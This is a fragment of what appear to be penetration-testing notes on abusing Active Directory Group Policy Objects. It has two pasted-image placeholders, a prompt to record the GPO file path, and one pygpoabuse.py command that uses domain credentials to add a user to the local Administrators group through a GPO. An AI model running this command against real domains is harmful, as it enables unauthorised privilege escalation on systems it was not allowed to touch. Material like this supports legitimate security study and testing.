...
![[Pasted image 20250821151340.png]]

Take note of the GPO file path:

![[Pasted image 20250821151241.png]]
#### Linux
...
```bash
sudo python3 pygpoabuse.py domain.local/username:password -command 'net localgroup administrators user /add' -gpo-id {GPO file path - object_id}
```
